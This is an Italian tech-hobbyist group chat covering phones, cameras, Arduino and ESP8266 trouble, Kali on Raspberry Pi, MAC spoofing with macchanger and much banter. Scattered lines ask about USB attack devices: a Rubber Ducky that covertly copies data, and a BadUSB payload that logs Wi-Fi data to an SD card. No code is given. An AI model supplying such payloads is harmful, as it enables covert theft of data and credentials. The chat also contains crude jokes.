Ma c'è scritto sugli estintori come usarli, e poi basta essere responsabili della sicurezza in una azienda visto che ti fanno fare anche i corsi su queste cose
Sorry, avevo mandato solo perché penso sia una cosa immorale fare pubblicità anche su YouTube
Ma sono dal telefono come faccioad accedere
È per gli scout
l' hai vista quella del PD? AHAHA
No
Evitate la politica fino al 4 marzo
guardala
❤️
Già glie l'ho detto io
Perfavore, evitate la politica
anarchic
Non si sta parlando di politica ma di marketing
Vabbè
Ragazzi devo caricare un condensatore da 100v e 1uf ho guardato su internet e ho trovato il circuito ma non sono ancora convinto della tensione e del resistore che devo usare.
Voi cosa mi dite?
Comunque romboli alla fine, nenache con il tuo metodo sono riuscito a far funzionare ESP8266
Ragazzi siccome ho ancora un vecchio Nokia lumia 520 che penso stia per finire i suoi giorni lentamente e con angoscia, secondo voi l'honor 6x o 7x sono buoni cellulari?
No
Xiaomi mi a1
O anche lo Xiaomi Mi 5x, se vuoi risparmiare qualcosa, che a quanto pare ha lo stesso identico hardware di A1, l'unica differenza è il software, supportato da Google.
Cosa non da poco a mio conto
idee?
Si
mi da sempre questo errore
Il 7x sì.... Anche il 9 lite. Ma io andrei di redmi 5 plus o redmi note 5 (pro)
E il mi A1?!
Anche il 6x non è male
Prendi il Mate 10
Si, effettivamente anch'io preferirei A1, proprio per questo motivo
270
Bello per carità... Ma i 5 di più
Meno bordi
Ma Google? La doppia fotocamera?
Anche il redmi 5 note pro ha la doppia fotocamera. E Google... I sorgenti del kernel sono usciti lo stesso dopo tipo 9 mesi
Si in teoria dovrebbe funzionare così
Comunque romboli..... nenache con il tuo metodo funziona l'ESP 8266
S3 neo spacca
In che senso?
Che non funziona in nessun modo
Ho chiesto a tutti e seguito mille guide 🤦‍♂️
Sono assolutamente daccordissimo, mi piacerebbe poter scegliere la pubblicità che viene fuori nei miei video
L'arduino con esp integrato che però era diverso da quello che avevo linkato?
Se vuoi fare soldi devi scendere a compromessi 
Si
Ma ormai ho perso le speranze e ne ho ordinato uno nuovo
Mi è arrivato l'amazfit Bip. Tanta roba. Ora ho più cose xiaomi di Marco
Ahahahahah
Preferisco renato
Comunque sarebbe bello studiare sociologia, studiare di come le pubblicità influiscono sulle nostre scelte
Quando in Black Mirror utilizzano un Raspberry

Uuuu
l'hai fatta partire davvero hahahahahaha
Ok grazie a tutti per i consigli
si dimmi 
Poi dipende ovviamente dal budget
Intorno ai 200€
Qualcuno sa perché quando sono sul software della naza non mi fa fare nulla e non mi salva i dati?
Ci sto uscendo pazzo

ma perchè kali linux per raspi è partizionato di merda?
ho 32gb e dice che ho esaurito lo spazio
look
come posso risolvere?
In teoria servono a registrare la sensibilità
Ti piace? 
🤔scritte e immagini troppo piccole..un certello deve essere visibile da lontano e comprensibile con un occhiata..sintetizza
Oky... ma di preciso quando li muovo che succede?
Io non lo ho però penso che aumenti o diminuisci il punto dove il sensore cambia di stato
Ho finito di montare l'Aio e di overcloccare la CPU
Mmm ok... grazieee

Quando Marco non ti mette assolutamente ansia
Io sono veramente INDINIATOH
Strano... Hai scaricato kali per raspi... Quello basato su jessi... Vero?
Io ho il presentimento che qualcosa andrà storto
E allora è la mano che si è autodichiarata in vacanza 🤷‍♂️
Voglia Dio che ti sbagli
Può sempre succedere
non portare sfiga 
È una evenienza
Tanto dalla nostra abbiamo un super Cicca con tutta la squadra di mega coders che ci proteggono
si
Vero, ma Marco sta caricando di ansia questo evento... Quindi anche i migliori potrebbero sbagliare
super Cicca che elimina cose a random*
Strano... 🤔 interessante però
ma qualcuno di voi sa un app che abbia la classe main?
Era per vedere se eri pronto
chi sa aiutarmi con il python? sto facendo uno script ma l'mp3 lo riproduce sempre
ma hahaha non seriva .-.
AHAHAHAHAHAHAH penso di non aver più aperto trello dopo i primi due giorni
wow...
credo non abbia tanta fretta
Non è da appendere è per illustrare l'uso dell'estintore mentre ci sarò io che spiego
Ora appare un badge "SE VUOI SUICIDARTI, FINISCI PRIMA QUESTO"

Ahahaha
ma noi non siamo semplicemente i migliori  siamo il TOP dei Topi
ah ok, allora va bene  solamente dai le scritte più grandi perchè così ti viene più facile leggere e spiegare, fidati
Non lo metto in dubbio
che sito è?
 tu che app hai usato per fare il payload?
Quello per fare le liste è Trello, il blog di Marco è 

che figo trello
Trello è una vera figata
Vabbè dal prossimo 
Matebook x pro troppo figo, ma quanto costa✖️✖️✖️
Devo collegarla così alla x2?.....chiedo di nuovo perché non funziona e ci sto uscendo pazzo
Sul software non riconosce nulla
❤️❤️❤️
Conosco io la soluzione
CSS siamo quasi, giusto un pelino più a sinistra
mi dispiace, dovrai convivere altri due giorni con quella scritta sfasata 
Nuuuuu
Ansia
Noo
Vi piace il mio sensore di apertura e chiusura?
Abbiamo capito!
e la figa?
cazzo con sta gente che ingegna non mi sento manco un uomo
È un sensore riutilizzabile
Funziona alla grande, accensione automatica della luce e avviso di chiudere la porta
io che faccio un liceo..pfft
Con la voce di una ragazza
AHAHAHAHHA
Appena vado al PC ti mando l'mp3
no io mi occupo solo di informatica, poi sono un auto didatta quindi..
Anche io autodidatta
Ma esiste ancora 
 xD
basta che ci clicchi sopra e sai tutto
Se avete ansia voi hahahahaahha
Domani non vado a scuola
Ordinanza del sindaco
Praticamente tutta italia non va a scuola
A Trento le chiudono solo se nevica un metro e mezzo o più
Io si
tranne me, tranne me tranne me tranne me..
A noi non ha nevicato nemmeno un po'
Ecco perché il centro è bello: se piove una goccia tutto chiuso, se nevica un fiocco tutto chiuso
E perché chiudono?
ma è inquinato
Vabehhhhhhhhh
Dettagli
Esatto
l' inquinamento va ad intaccare i tessuti grassi tipo il cervelll. fa te
Il nord è più vicino a Chernobyl poi

Raga qualcuno ha GBWhatsApp??
Avete visto il nuovo agfiornamentooo
Ma anche no
Bellissimooooo
O quando fanno l'adunata degli alpini
Figo
Tipo telegram
Ma tutti di Trento siete? 
Se ti mandano "robe" rispondi "robe"
tipo?
Questo
ma che 
Ahh si che bello
Cos'è cambiato?
Y
Cosa c'è di nuovo?
noi poveri sfigati del sud si..
vero 
?
Quello dell'auto reply?
Hanno aggiunto l'auto reply ai messaggi
Anche per te  ⬆️
Serio? 
ovvero?
Ma c'è un metodo sicuro per alleviare i graffi sugli schermi touch?
Intendo che c'è giá e di riuscire a toglierlo
Il dentifric... Ehm
Boh non credo
Prova a fare una rettifica al tornio o fresatrice
Ah bhe sicuro che sul touch funziona benissimo hhhah
Raga idee per un portfolio web ?
Giuro che ho provato con la rettifica
Che poi inizio a vedere i primi problemi....

Stavo litigando con un'amica e mi scrive "ok basta ciao"
E il cellulare risponde da solo "ciao" 

È giustamente non ci credeva non l'avessi scritto io

Un telefono vecchio ovvio
Si bhe per un pc portatile touch come fai a fare una rettifica hahahah
 ogni quanto pubblicherete sul blog? Avete bisogno di aiuto?
Ah... Quelli sono morbidi
Va fatto sul vetro proprio
Eh
Ed esce bene  va solo pulito con qualche prodotto dopo
Provo con il lucidante per metalli hahaha
Massi provar non nuoce 
Comunque non credo si possano togliere
Hahah ho un PC da battaglia qua.... Domani o graffio e provo a giocherellare
Tipo Rulof aveva tolto i graffi dalle lenti degli occhiali
non farlo
Lì è diverso il materiale
cioè, non è una cosa che funziona al 100%, viene una mezza cagata e infatti ha cambiato occhiali
Con un disco diamantato al surface grinder si toglie

Bhe tanto è un PC rotto tanto vale testare qualcosa visto che l'asta che ho fatto su eBay del pc... Era in tedesco e non mi aveva tradotti bene che erano presenti delle ''abrasioni di 5cmq'' sullo schermo
Non so cosa intenda ''abrasioni'' Google traduttore ma quel 5cmq non mi piace molto
L'i9 ha un problema 🤔
Consuma troppo?
Potresti provare con pasta abrasiva, quello che di solito si usa per pulire le superfici dei metalli
A quanto pare sono arrivati un i9 e un i7
Fa bottleneck hahah
Invece di due i9
Eh il metal polish tipo sidol
E quindi a te tocca l'i7?
Quindi la buona notizia è che sono arrivati da Tom's, la cattiva è che domani farò uno Skype con le unghie con un altro yter
Si
Optisch: Gebrauchsspuren, stellenweise abgenutzte und zerkratzte Gehäusekanten und Displaydeckel, strichförmige Tastaturabdrücke auf der Displayoberfläch verteilt, drei ca. 5cm² große Abschürfungen im oberen Displaybereich, Tastatur und Handballenablage abgenutzt (glänzt) 
=
Ottica: segni di usura, bordi della cassa usurati e graffiati e coperchio dello schermo, stampe della tastiera a forma di linea distribuite sulla superficie del display, tre abrasioni di circa 5 cm² di grandi dimensioni nella parte superiore del display, tastiera e poggiapolsi consumati (lucentezza) 

Se qualcuno sa tradurre meglio che Google ogni tanto interpreta male 
Ahahaaha
Come studio diritto

Lol riconosco quel venditore
ragazzi, non riesco a trovare da nessuna parte la presentazione delle nuove sony che dovrebbe essere tra 10 min, qualcuno che mi può aiutora nonostante l'orario?
No idea sorry 
va bhe, aspetto altri 20 min se non trovo nulla stacco
?
che presentazione?
sei sicuro che sia adesso?
Sony
ma sony ha fatto la presentazione stamane o sbaglio?
marco aveva scritto sul canale overvolt che all'1 ci sarebbe stat la presentazione delle nuove mirrorless
ahhh
si, ma ha presentato solo gli smartphone
magari intendeva le 13
Niente, le mirrorless le presentano stanotte all'una
mah
che io sappia la sera la gente va a mangiare e a bere, quindi ha poco senso presentare le cose di notte
va bhe, mo stacco se presentano qualcosa me ne accorgerò quando mi alzo
ma non presenteranno niente, gli influencer hanno smesso di postare sui social da 3 ore
anche perché le presentazioni finiscono alle 19
Scrivicela così la sapremo anche noi
per ogni video importante faremo un articolo, per hacking bisogna vedere, non ne ho idea
è notte da noi, mattina negli USA
e niente, GitHub ha deciso di darmi il buongiorno così
solo io non lo riceverò mai
più che mandare foto del libretto e del tesserino scolastico ci posso fare poco
io ho mandato solo la mail della mia scuola 🤷‍♂
Ma mezza svastica sul colletto??

Stavi per farla
Voleeeeeevi
Ciao, come faccio un for che va avanti fino a tutte le lettere di una parola?
Python
for letter in word
Ecco, mi hai preceduto di un secondo

Il potere di "nooo non voglio andare a lezione"
OK grazie mille
Nel mio caso è "noooo non ho voglia di alzarmi, voglio dormire"
Solo che mi sono alzato comunque e arriverò a lezione 30 minuti in ritardo nel peggior caso
Eh io la ho già superata quella fase

Ma è a Barcellona
Dimmi come perché sono mesi che vado avanti cosí...
Nono superata stamattina
Ogni giorno si ripresenta
Ah... Sad
l'hanno fatto in modo che negli USA fosse mattina
Continuo a non capire 
Perché ci sono mille presentazioni in contemporanea? La presentazione delle mirrorless era a Las Vegas 

Si è sciolto prima di essere acceso?
Ah
Ma infatti sono macchine fotografiche, non telefoni
Le hanno presentate al Wedding Convegno Qualcosa di las vegas, non c'entra l'MWC
ma la gente diventa scema così 
Badum tzzz
L'hai venduto già il ryzen 7? 
Stessa cosa che ho pensato io 

Se mi gira dopo sistemo 
Nah sistema le altre cose... Tanto deve durare oggi e domani
Fidarsi è bene non fidarsi è meglio, a quest'ora ti eri già ripagato la nuova build
Eh si vedrà credo
A me lo hanno attivato con lo screenshot di una pagina del registro elettronico col mio nome
scusate
MAVVAFFANCULO
questo non vale come politica vero?
trump è un troll
Se non mi fossi fidato di Tom's adesso avrei un canale nato come overVoltTemp con 4000 iscritti
Al 70% c'è
Ho buone chances
Mah!
Nono tranquillo, è coglione e basta
è tipo un postulato
anzi nemmeno:
si può dimostrare
Aaaaa..sto a scuola ,ho visto questo e sono scoppiato
Ma che cazz
8==D-- è sexy
Che poi si potevano evitare i due --
Si,ma è il codice della ragazza sexy
a me sembra un chiaro segnale
Anche troppo
Come?
probabilmente sta cercando qualcuno per fare pissing
Rip
Volevo farvi vedere la RAM ddr5 di arcobaiter
purtroppo funziona con una whitelist e non con una blacklist 
Tanto non era arcobaiter, ho sbagliato
anche il canale di linux è vietato
Ahhhh questi terrapiattisti
non è che certi sono vietati, sono tutti vietati a parte 4
sisi lo so ahah
- OfferVolt
- OverVolt
- ICouponDiCorrado
- ProgrammerJokes
son destinato a non averlo
Il vostro arduino si surriscalda spesso?  Nessun problema
A me non si surriscalda
Ma nemmeno a me Lol
A cosa ti serve quel mini dissipatore?
Niente
Ero ironico
"mini"
È il dissipatore Ryzen stock
Ah ok
Togliere Kali 
Conviene? Cosa offre di così vantaggioso?
In realtà una mano potrebbe servire, comunque dopo giovedì
Se posso fare qualcosa 
Sei diventato povero?
Secondo voi si può fare una rubber ducky per copiare i dati da una chiavetta ad un altra??
basta che gli fai eseguire cp
Sono combattutissimo
Non ne vale la pena secondo me
In caso... La a7ii
Costa di piu
Molto
E questa ha 15 stop di gamma dinamica 
Aspetta mi sono perso un pezzo
Quella nuova è la a7iii?
Yup
Lol ok
La a7ii
Allora
Col cazzo
Quella fa schifo
Sui videonauti molti dicono che non sarà un grande passo avanti
Boh
Tanto io comprerei nikon 
Ehi 
A favore del Mavic Air:
- Per la Sony servirebbe anche un obiettivo fullframe
- ne vendo sicuramente di più coi referral quindi un po' rientro nella spesa
- so che poi comprerei un Dicapac e mi porterei la Sony sott'acqua nel mar rosso... e faccio cazzate di cui mi pentirò 

A favore della Sony:
- i droni sono vietati in israele quindi una vacanza su due mi è inutile
- è la migliore in assoluto (mannaggia alla mamma di chi non ha messo il display girevole e/o il touchscreen)

A favore del 16-35 f2.8:
- è una fottuta signora lente
- potrei usarla anche su Canon senza aspettare la sony
Nulla di troppo innovativo?
Nono, è una questione di budget non illimitato
Se lo stai facendo per i video secondo me è una stronzata prenderla
Quant'è la botta?
Up
?
Nono fidati
La qualità dei tuoi video per me va benissimo!
Di soldi dico
Davvero... Una macchina fotografica la hai già
E funziona bene
Ma risparmia Marco!
Uuuup
Fa 200.000 di ISO, è un fullframe, recca in 4K, ha l'autofocus Sony, ha il sensore stabilizzato, ha più megapixel di non so, è leggera, non si rompe con gli urti, ha 15 stop di gamma dinamica...
Poi quando uscirà qualcosa di davvero wow spendi
Queste sono solo le cose in più rispetto alla canon
Si, okay, è ottima.......ma ti serve veramente?
Uuup
I video così sono di qualità molto buona
Meh, non mi soddisfa appieno
Come anche il 16-35 secondo me è un pelo inutile... Ma meno inutile della Sony
Nemmeno la Sony lo farà tra sei mesi
È ingiustificato il costo più che altro
Nono vez
Quanto costa?
2000 usd, è pochissimo
No, dai marco, risparmia
2000usd di lancio vuol dire che tra un mese la trovi su eGlobal sui 1000€
Fidati
Beh comunque mercoledì ci sono i preordini, aspetto che li shippino e che youtube cominci a popolarsi di recensioni
Ma sei sicuro di voler investire tutti questi soldi ora?
Uuup
La fotocamera tua che hai adesso funziona comunque bene, la qualità è buona, magari non quanto quella nuova ma stiamo parlando di 1000€
Al massimo rimani con quel budget per l'anno prossimo
Beh dalla canon comunque un 600 li tiro fuori eh
Tanto poi uscirà la a7siii o la nuova a9 e dirai che schifo la mia mi devo comprare quella nuova
Speraci
La a9 è già uscita ma è da fotografia sportiva
Ovvio che la gamma s è pensata per video, ma questa ha un prezzo accessibile, le S no
Hau capito il concetto
Sta cosa di comprarsi la Sony è giusto una scimmia
Ma prima controlla se c'è richiesta
Ovvio che c'è sempre di meglio e non per questo devi sempre schifare quello che hai, ma se è un meglio raggiungibile perché no?
BTW è uscita la nuova RED Weapon Monstro 8k
Perché non fai altro che schifare quel che hai dopo sei mesi che lo hai
Registra 120fps sul 4K e 240FPS sul 2K... Se non ci attacchi almeno un paio di SSD da 1TB è inutile 
Sei mesi sono tanti ☺️
Aspettane sei e compratela quando "davvero" ti serve
In realtà è normale
Sai che faccio? Spendo un 500€ in un monitor 4K con buoni colori e poi vedo se i video della Canon mi soddisfano 
Ma vuoi proprio spendere te?

E poi vai a dire che non hai i soldi per mangiare fuori 
Nooo
Avevo mandato l'offerta di S8 a 496🤦‍♂️
Ahahahah
ushh dove?
Martina (Puglia)
Adesso in tutta la Puglia però
Sai che adesso che mi ci fai pensare questo kit non è niente male?
Obiettivo da 600€, SSD da 120gb, schermo touch qualità cine, pelikan case, 250usd di credito, due batterie... 🤔🤔🤔
Scommetti che trovo di meglio?
È inutile...... hai voglia di spendere 
Magari sì, magari no...la live a quando?
Quindi in pratica invece di farne pochi fatti bene...
Serie 2, 4, 6, 7, 8
Fatto apposta per uccidere la fascia media...
Perché si crea una nuova fascia che va a sostituire la vecchia fascia alta, che nell'ultimo anno ha visto un aumento di prezzo assurdo
Quindi ci saranno i telefoni da 900 euro con la serie 8, quelli da 600 con la serie 7, da 300 con la serie 6 e di meno cin la serie 4
Invece quello che si stava creando adesso è che ci sono molti più telefoni con la serie 6
Considerando che già ora il nuovo 450 è praticamente un 625 con 0.2 GHz in meno su due core... I processori serie 6 verranno lasciati indietro
Esatto, solo che il 660 è "Serie sei" e quindi lo trovi su telefoni da 300 euro
TROPPE COSE
Repo privati, Microsoft Imagine, Git Kraken, 50€ di credito Amazon AWS... solo per dirti le migliori
Appunto appunto 
Il OnePlus 3T è abbastanza recente da poter ricevere lo sconto per l'S9?
Dai un'occhiata, dovrebbe esserci scritto
Grazie
Ora controllo
Ma sì, è di un anno e mezzo fa.. L'anno scorso di questo periodo era il dispositivo di punta di oneplus
Ma vah
Guyss giorno
Sbagliato grupp
Conoscete Vero? Il social network
No
Ultimamente sta spopolando e non capisco perché
Non ha niente di nuovo
Ma le due offerte uscite su offervolt sono sconvenienti, su amazon viene venduto a 160€ e viene spedito entro 3 giorni, invece negli altri due annunci devi aspettare delle settimane
la mia vita è appena cambiata
???
ho scoperto che ci si può rigenerare le cartucce pere stampanti inkjet da soli, con 10 euro si prendono 100 ml di ogni colore
Sta spiegando
Ah
No no no, aspettate...

 ‎€4‎1.‎24‎ i‎nv‎ec‎e ‎ch‎e ‎€8‎7.‎06
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎2.‎63%
⭐️‎ 4‎.8‎6 ‌‎/‌‎ ‎5.‎00‎ (‎37‎5 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Gearbest
 

Che fanno ste scarpe?

Il caffe
isolano il piede e offrono un comodo supporto con cui camminare sulle asperità del terreno
E perché hanno un processore per fare ciò?
non sanno come smaltirli
sono processori di smartphone invenduti
Ah regalateli
È nuovo, basta quello
Posso mandare un video parodia di "cara italia" con salvini o rientra nella regola riguardante politica?
aaah.. questi buchi normativi
Il mondo è così bello
Penso rientri nella regola temporanea
Conoscete qualche app figa?
Perché sono smart
Che palle!
Nono evitiamo
Eh ma che fanno?

Raccolgono un sacco di dati sul tuo running e poi hai l'app per vedere come col miband
Si può catalogare nei fitness tracker
O meglio, utile
Squid
Trello
Mega
Non voglio andare controcorrente ma
Non mi piace per nulla
TV time
Appy geek
Raspi check
Mh è interessante come app, la utilizzi?
I widget come sono?
L'ho provata per un po' di tempo
A me è sembrato molto buona, soprattutto come brain storming
Die with me
È molto utile
Insomma hahahah
Non seguo serie tv
Il nome è interessante
Exit please
Sono news riguardanti solo tecnologia
Hahahahah
Appena visto, utile
E invece conoscete qualche giochino figo?
Perditempo, insomma
Peggle
Ci andai in fissa.. Non voglio caderci di nuovo
Arena of valor
15 e passa minuti di gioco, tipo lol
O Hearthstone
raga ho un problema con il computer, non so come mai ma i giochi un po' più pesanti hanno iniziato a laggare, ho una scheda video più che buona e il lag è abbastanza strano perchè il gioco va a 60 fps stabili e poi per meno di un secondo si blocca tutto
e lo fa costantemente
controlla che windows non stia usando l'hdd
magari lui fa le sue cose e ti rallenta tutto
quando vedi la madonna ascenderti e decidi di, piuttosto che studiare storia o matematica per la verifica del giorno dopo, fissare quel numero finchè non diventa 19GB
Anche io ho la verifica di storia
13 pagine
Ahhahaha
La prof non se ne era accorta
Duel link
perdono non volevo
eliminate pure il mess
davvero scusate🤯
Fighissimo quel gioco, peccato che ho la memoria piena
E si è proprio bello. Soprattutto se da piccoli si giocava con le carte
Esattamente hahahah
Peccato solo per quella serie di dettagli quali il campo con solo tre spazi
Qualcuno ciá un payload per la budusb che mi memorizza i log in un micro sd. Per il wifi?
Devo fare un progetto dove devono comunicare due schede Arduino tramite moduli radio e labview, praticamente un Arduino è collegato al pc con labview e l’altro Arduino è distante con il modulo ricevitore radiofrequenza e deve fare quello che dice l’arduino principale collegato a labview qualcuno sa come si potrebbe fare?
ragazzi qualcuno di voi sa consigliarmi un apk android per crittografare foto e video che utilizzi qualche metodo di Crittografia?
gia fatto
Ehm... È un bot

Da noi fa freddo e basta 
Soffri 
Da noi ha smesso di nevicare ed è uscito il sole, si è sciolta la neve 
Però hanno già chiuso la scuola, quindi...
Apple conferma l'uso del cloud di Google per iCloud




Condiviso dal mio feed Google
Ops
OOPS
Plot Twist
Quando il tè è tropo caldo ma tu sei studiato
HAHAHHAHA
Honest
E pensare che credevo fosse un thermos
Ho visto dopo la ventola AMD

Con il microscopio?
cosa
Anche il deck con massimo 30 carte... però comunque bello
Ci soffi sopra anche la polvere
beh seriamente, io sono ore che sto facendo esercizi di matematica e fissando lo schermo e sto ancora a 13GB su 19, mi sento male, meglio che studi storia vah
ssshhh
no beh comunque io proverei ad alzare la tensione per vedere se come tutte le brave ventole amd si mette a fluttuare con il te con solo la forza della pressione dell'aria generatasi ai bordi, tanto a minimo 800kV la spari prima di bruciarla

Hai messo la pasta termica?
Ahahaha c'è un motivo se ha smesso di scrivere ahaha
Intossicazione da pasta termica nel tè
Per freddato bastava aprire la finestra con sto tempo

 Io comunque mi sono deciso a cambiare l'antenna del mio rc 
Vadi!
Ora devo solo cercarla su internet ahahahahah

qualche consiglio sui parametri dell'antenna?
Se non sbaglio devo prenderla 2.4 Ghz
Prendi il cavetto che avevi linkato
Quello si
E per l'antenna vedi il video che avevo linkato
Ricordati che l'i6s ha due antenne demtro
Cazzo mi sono dimenticato di vederlo!!! 
Ieri dovevo studiare per il compito di fisica e mi sono scordato ahhahahah
Ci stavo pensando... ne metto anch'io 
due oppure ne tolgo semplicemente una? 🤔
mandano la tua posizione in giro per il mondo
Ahahahah
Lo collego al 220 e mi scrosta la vernice delle pareti della casa dei vicini
Ma come si fa a taggare un persona non utilizzando il suo Nick ma un nome diverso?🤔
Riferito a ciò
Oh salve
Avevo un problemz con la emui, non trovo proprio l'impostazione smart lock.
L'ho già attivato si, ma non trovo gli smart lock tra i metodi di sblocco.
ah si ricordo ahahah
e poi hai risolto?
Nope
Non trovo l'impostazione tra i metodi di sblocco
hai Huawei scommetto
Yep
ahhaha
Honor 6
classico
anchio ho avuto problemi con quel telefono di cacca
Non mi dire che non c'è :(
per conto dello smart lock
Smart lock è quell applicazione di merda che impedirebbe a un malintezionato di formattare un telefono gia usato
il quale nn conosce email e password giusto?
No, volevo lo sblocco facciale descritto nel video si overvolt
io ho avuto problemi con smart lock per conto di sbloccare il bootloader per il root, ricordo...
con un Huawei
LG MAGNA
cmq potresti linkarmi il video di overvolt in questione? sono curioso
grazie
vedi qui cge dice. per esempio? Google smart lock ti consente di proteggere il dispositivo e l account. "smart lock per Android : tiene automaticamente bloccato il. tuo telefono quando nn lo hai con te o in condizioni di sicurezza."
Nono io intendo i metodi di sblocco
devi andare su sicurezza poi. smart lock
accedere al blocco schermo e poi avanti
hai gia provato?
Aspe
Dove?
impostazioni
Non c'è "sicurezza"
strano... dece starci
elgamal
magari sta messa in un altra posizione
Ah no trovata
Ok
Poi
poi smart lock
Non c'è
È questo il problema
dimmi le vici
voxi
voci che ci sono?
o fammi uno screen
Da quà appunto si attiva smart lock ma poi non succede nulla
Verrà aggiunto il referral di  AliExpress ? 

Non credo
AliExpress è un fucking casino
Nulla che 
 non possa sistemare
Nono è che non esiste un tag univoco da inserire
ditelo che poi si aggiunge al bot
ah vero, l'avevi detto
Se vuoi farti assumere dai cinesi e riprogrammargli...
Ma intanto CORRIIII
*web scraping intensifies*
C O R R I
cazzo l'articolo
Marco, stavo pensando, ma se nel blog mettessi un piccolo shop?
non fargli venire idee adesso 
Consigliamo dove comprare la roba ma non posso aprire uno shop mio 
Neanche con BigCartel?
De Medellín?

Col big cartél fai i money
perchè conosco questo essere ._.
Mi chiamo Marco 13 anni e sono del nord
Posso chiedere un favore?
Che schifo huawei
Lo smart lock è introvabile
"Sono del nord" cit.
LOL
Ok basta seno rischio il ban
Coseno tranquillo, ti difendo io
Basta che non parti per la tangente
E se faccio arco?
Arco tangente *btum tss*
secante
La prima volta che ho sentito arcoseno mi sapeva di bestemmia

Effettivamente
Tipo quelle bestemmie strane che buttano in friuli
beh, ora che ci penso, perchè non si chiama direttamente baiter^-1? è più corto e 

Tecnicamente è solo una lettera in meno
Ho un idea
beh no, il "^" non lo metti, metti direttamente gli apici
Uso il mio 4° VoIP per proporgli l'idea
Perché non è così studiato
Devo spammarvi un video
giusto
: 
Scusate Lo spam ma sono esploso
k, io pensavo di tentare di superarti nel criptamento ma ho passato l'ultima ora su ffxv e probabilmente continuerò per tutta la notte
guarda l'ultimo video di electroboom
"Superarti nel criptamento" è solo un focking rand
si ma tu non so che cazz hai fatto ma hai criptato in modi assurdi
Eheh no
Solo non lo do a vedere
a bello
beh meglio che studi storia e ffxv per ora, addio
È un semplice
Per ogni char sostituiscilo al suo valore ascii+ un numero random da -32 a 31
Tantan
a...quel che ho fatto io insomma, solo che io ho usato un altro intervallo di numeri ._.
BRAVO
così si fa
Ye
Non la capisce 
Se non la capisce glie la spiego
probabile, ma ssshhh, l'importante è aver fatto la meme
Tanto mi segnala per spam perché pensa che sia un insulto
ma come minimo
AHAHAHA
dai dai, non ci provare
Ho appena seguito la presentazione degli Asus Zenfone 5. Hanno palesemente "preso spunto" dall'iphone x
tan^-1 = arco tangente
sen^-1= arco seno
baiter^-1 = arcobaiter
Da oggi
Quindi shh e acconsenti
ora scopro che ci sono i flauti traversi midi 
ditemi che esiste plis
Si
Esistono pure le trombe midi

mo' lo cerco
L'unico problema è che costano quanto una Bach praticamente
Già visto
La definiamo, ad ogni valore di x  appartenente ad R associa la riproduzione di un willy il coiote in tutte le dimensioni spaziali
Costruiscilo
Arduino way
: 
il video è incentrato su quello
 guarda questo :
: 
Che ne pensate?
Bello
Ma è strabiliante sta roba
potrei effettivamente
 
  aiut
ti pare che non l'abbia visto? 
bella li
Rispondigli " è il tuo reciproco"
spiegagliela 
Fatto
hai visto quello del Mixer? Aruidno midi fader o qualcosa del genere
Poi magari qualcosa come
"Ma tranquillo, è solo una frazione di te"
Dopo di questa voglio il mod
Come disinstallo questi due?
Scusate per la domanda stupida: ma se cambio l'ip mac può succedere qualcosa al pc (magari non si connette più a internet)
siù
Che tipo di problemi potrei avere?
che non va più su internet
aspè... ma l'ip o l'indirizzo mac?
Indirizzo mac, ho sbagliato
Ragazzi ma cosa rischio se prendo una micro sd su AliExpress?
basta che metti un mac valido
eeee, come lo cambi un mac?
Virus?
Non si può cambiare?🤔
è un indirizzo fisico e univoco per ogni dispositivo
Ho visto dei programmi che ti permettono di cambiarlo, ma non volevo fare cagate
vai tranquillo
Sono fake i programmi allora?
no, funzionano
Hai mai cambiato l'indirizzo mac?
ni, nel senso che per funzionare funzionano ma sono solo una virtualizzazione se si può dire così..almeno da quel che ne so, quindi non so quanto possa essere pericoloso per un pc, non c'è alcun pericolo se intendi usando quel tipo di tool
si
perchè al massimo reimposti quel che stava prima e sei apposto...o in caso anche riavviando il pc credo
Che programma hai usato?
macchanger
Dopo provo, spero di non fare danni
Tutti li ho visti 
Ricordati di segnarti il MAC originale... Non so perché ma tanti dicono di farlo
Spacci Arduino?
In teoria se non va devo rimettere quello
Visto il video di Casey? Ma che figata il drone 🤗
Non succede niente cambiando l’indirizzo Mac
A meno che sei in una rete con riconoscimento del Mac. In quel caso potresti avere problemi a entrare nella suddetta rete. Ma le reti private non sono quasi mai così
??
Ma scusa il mac non si usa una sola volta alla prima autenticazione?
Oppure quando hai solo 4€ e devi farti un pranzo?
giusto
cos
Grazie
Però sono certo che in molti tutorial ti consigliano di appuntare quello originale... Anch'io mi sono chiesto cosa sarebbe accaduto... Però l'ho fatto 
Ops
E in tutto questo la cosa che più mi ha colpito è stata la notifica del meteo che segna -4

Alla fine siamo riusciti a convincere Marco 
Secondo te perché gli ho rotto la macc.... Ah cazzo che qui legge anche lui
Ahahahah
Diciamo che almeno così spenderà soldi per qualcosa di necessario 
Ma no dai che probabilmente è una cazzata, speriamo
Che hai fatto?
Nulla 
Era una battuta
Ahahahah
Sera
Almeno si è fatto una bella passeggiata
Sera

Bella la neve?
Che neve?
Che neve
C'è più neve nel mio freezer che in tutta Trento
Non avete la neve?
Ahahahahah
Il sud regna 
Fossi uno sedentario  normalmente mi muovo solo in bici, anche con -10° e le strade innevate
Nope, penso che ne avete più voi al sud

Vabbè, ma la macchina?
Abbandonata
Nel mio parcheggio
Ahahahahah
È al sicuro la ragazza
Riesco a sentire la felicità di Marco 
Boh comunque a quanto pare non è grave, sembra sia il tubo del turbo
Notizie dagli sviluppatori del blog a meno di 18h dall'apertura:

"Siamo nella merda"
Perché?
Perfect
Eeeh abbiamo ancora un sacco di cose da fare in pochissimo tempo
mooolto in riassunto
Ahah fa più freddo da noi 
Ce la fate per domani?
Al massimo cicca e romboli fate un salto di 150 km qui
Poi c’è Enna. La città più fredda del sud dove nevica sempre. Quest’anno niente...
Ba dum tss
E qui ci sono -8 gradi e sta leggermente nevicando
Di dove sei?
Sotto vicenza
Io Treviso e anche qua -6° e nevica leggermente
Allegro, ma io continuo ad aspettare quella nevicata da metro e mezzo
Spero. Al massimo vedrete il blog aprire verso le 16
Cazzo devo calmarmi 
per dirvi, il messaggio che ho mandato al team non entra in una schermata 
"Ce" non c'è


No
Ma 
 non è avaria al motore quella
"Avaria al motore", that's all I know
É il "Check Engine", vuol dire che hai o le valvole sporche o hai fatto molti chilometri e in teoria dovresti revisionare/tagliandare
Si può vedere anche con l'elm827 con il bluetooth


: Bluetooth OBDII OBD2 Diagnostic Scanner Scan Tool ...
Buongiorno ragazzisituazione climatica di stamattina 

